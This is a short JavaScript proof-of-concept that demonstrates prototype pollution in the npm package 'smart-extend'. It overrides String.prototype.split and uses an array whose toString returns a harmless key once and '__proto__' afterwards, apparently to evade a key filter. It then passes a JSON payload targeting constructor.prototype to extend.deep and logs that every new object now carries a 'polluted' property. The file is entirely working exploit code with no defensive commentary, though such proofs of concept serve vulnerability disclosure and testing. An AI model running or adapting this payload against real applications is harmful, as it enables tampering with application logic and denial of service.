var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
var extend = require('smart-extend');
obj = {};
console.log({}.polluted);
var payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
extend.deep({}, JSON.parse(payload));
console.log({}.polluted);